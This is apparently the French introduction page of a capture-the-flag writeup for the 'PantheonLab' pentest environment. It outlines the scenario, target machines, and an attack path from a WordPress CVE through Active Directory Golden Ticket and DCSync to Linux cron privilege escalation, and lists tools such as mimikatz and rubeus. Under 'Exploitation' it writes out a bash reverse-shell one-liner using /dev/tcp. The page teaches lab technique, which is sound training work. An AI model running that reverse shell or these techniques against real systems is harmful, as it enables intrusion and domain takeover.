# Introduction au Writeup

!!! danger "⚠️ Avertissement - Copier n'est pas apprendre"
    **Ce writeup est fourni à des fins éducatives uniquement !**
    
    🎯 **Recommandation forte** : Essayez d'abord de résoudre le lab par vous-même avant de consulter cette solution.
    
    📚 **Pourquoi ?** 
    - Les **vraies compétences** se développent en cherchant, en échouant, et en recommençant
    - Copier-coller ne vous apprendra **rien de durable**
    - La **satisfaction** de résoudre un défi par soi-même est incomparable
    - En cybersécurité, **l'adaptabilité** est plus importante que la mémorisation
    
    🏆 **Rappelez-vous** : Il n'y a aucune récompense à la fin de ce lab, si ce n'est les **compétences et connaissances** que vous aurez acquises. Autant que ce soit par votre propre effort !
    
    💡 **Utilisez ce writeup comme** :
    - Une **validation** de votre approche après avoir trouvé
    - Une **aide** quand vous êtes vraiment bloqué (eviter cette page car elle résumer beaucoup de choses simultanément.)
    - Une **source d'apprentissage** pour comprendre les techniques

## 🎯 Objectif du Lab

Ce writeup détaille la résolution complète du lab PantheonLab, un environnement de pentest inspiré de la mythologie grecque. L'objectif est de démontrer une méthodologie complète d'audit de sécurité, de l'énumération initiale jusqu'à l'obtention des privilèges administrateur sur toutes les machines.

## 🏛️ Contexte du Scénario

Dans l'univers de PantheonLab, les dieux de l'Olympe ont décidé de mettre en place des jeux afin de permettre à un mortel de se hisser au-dessus des autres et de les rejoindre au Panthéon. Cependant, un dieu, Hermès, s'agace dans l'ombre de n'être que le messager. Il a introduit des vulnérabilités pour s'approcher discrètement des dieux — des vulnérabilités que vous devrez identifier et exploiter afin de compromettre entièrement cet environnement.

### Machines Cibles

| Machine | IP | Rôle |
|---------|----|------|
| **Olympe** | 192.168.56.10 | Serveur Linux/WordPress |
| **DC01** | 192.168.56.11 | Contrôleur de domaine  |
| **Enfers** | 192.168.56.12 | Serveur membre |

## 🔍 Méthodologie d'Attaque

### Phase 1 : Reconnaissance
- **Énumération réseau** : Découverte des machines et services
- **Énumération web** : Analyse du site WordPress
- **Recherche de vulnérabilités** : Identification des vecteurs d'attaque

### Phase 2 : Exploitation Initiale
- **Exploitation WordPress** : Exploitation de CVE
- **Obtenir un shell** : Accès initial sur Olympe
- **Élévation de privilèges** : Accès à utilisateur hermes

### Phase 3 : Lateral Movement
- **Énumération Active Directory** : Découverte du domaine
- **Exploitation des credentials** : Utilisation des comptes trouvés
- **Accès aux machines Windows** : Pivot vers DC01 

### Phase 4 : Compromision du domaine
- **Escalade de privilèges** : Obtenir l'accès administrateur
- **Accès aux machines Windows** : Pivot vers ENFERS 
- **Golden Ticket** : Contrôle total du domaine
- **DCSync** : Extraction des hashes du domaine

### Phase 5 : Escalade de privilège linux
- **Password Reused** : Connexion en tant que hera sur la machine linux
- **Exploitation** : Insecure cron jobs
- **Escalade de privilèges** : Obtenir l'accès root

## 🛠️ Outils Utilisés

### Énumération
```bash
# Réseau
nmap 
netexec||nxc

# Web
wpscan 
gobuster

# Active Directory
netexec||nxc
rusthound
bloodhound
```

### Exploitation
```bash
# WordPress
CVE-2025-32118.py

# Reverse Shell
bash -c 'bash -i >& /dev/tcp/192.168.56.1/9001 0>&1'

# Active Directory
mimikatz.exe
rubeus.exe
SharpSuccessor.exe
GMSAPasswordReader.exe
```

## 📊 Progression Attendue

### Niveau 1 : Accès Initial
- [x] Énumération du réseau
- [x] Découverte du site WordPress
- [x] Identification de la vulnérabilité CMP Coming Soon
- [x] Exploitation et obtention d'un shell

### Niveau 2 : Élévation de Privilèges
- [x] Accès utilisateur hermes
- [x] Découverte des credentials SMB
- [x] Accès au domaine Active Directory

### Niveau 3 : Lateral Movement
- [x] Énumération complète du domaine
- [x] Découverte des utilisateurs et groupes
- [x] Exploitation des vulnérabilités Kerberos

### Niveau 4 : Contrôle Total
- [x] Escalade vers administrateur
- [x] Création de Golden Ticket
- [x] DCSync du domaine
- [x] Privesc Linux


## ⚠️ Avertissements Importants

!!! warning "Environnement Contrôlé"
    Ce lab est conçu pour l'apprentissage dans un environnement isolé. Ne jamais tester ces techniques sur des systèmes de production sans autorisation.

!!! info "Légalité"
    L'utilisation de ces techniques doit toujours respecter les lois locales et les autorisations appropriées.

!!! tip "Bonnes Pratiques"
    Documentez chaque étape, prenez des captures d'écran, et comprenez le "pourquoi" derrière chaque technique.

## 🎯 Objectifs d'Apprentissage

### Compétences Techniques
- **Énumération web avancée** : WordPress, plugins, vulnérabilités
- **Exploitation Active Directory** : Kerberos, DCSync, Golden Ticket
- **Lateral movement** : Pivot entre machines
- **Privilege escalation** : Windows et Linux

### Compétences Méthodologiques
- **Approche structurée** : Méthodologie de pentest
- **Documentation** : Writeup professionnel
- **Résolution de problèmes** : Debugging et troubleshooting
- **Pensée critique** : Analyse des vulnérabilités

## 📚 Ressources Complémentaires

### Documentation Technique
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks Active Directory](https://book.hacktricks.xyz/pentesting/pentesting-active-directory)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [The Hacker Recipes](https://www.thehacker.recipes/)
- [The Hacker Recipes](https://www.thehacker.recipes/)
- [akamai/Badsuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)


---

*Que la sagesse d'Athéna vous guide  !* ⚡🏛️ 
